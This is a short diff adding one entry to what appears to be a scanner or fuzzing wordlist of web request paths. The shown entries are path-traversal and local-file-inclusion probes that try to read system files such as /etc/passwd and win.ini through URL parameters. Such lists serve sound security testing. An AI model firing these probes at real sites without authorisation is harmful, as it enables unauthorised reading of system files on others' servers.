@@ -807,3 +807,4 @@
 /RP?wsrp-url=file:///etc/passwd
 /RP?wsrp-url=file:///c:\\windows\\win.ini
 /index.php?mod=textviewer&src=file:///etc/passwd
+/DownloadWindow.php?filename=../../../../../../../../etc/passwd
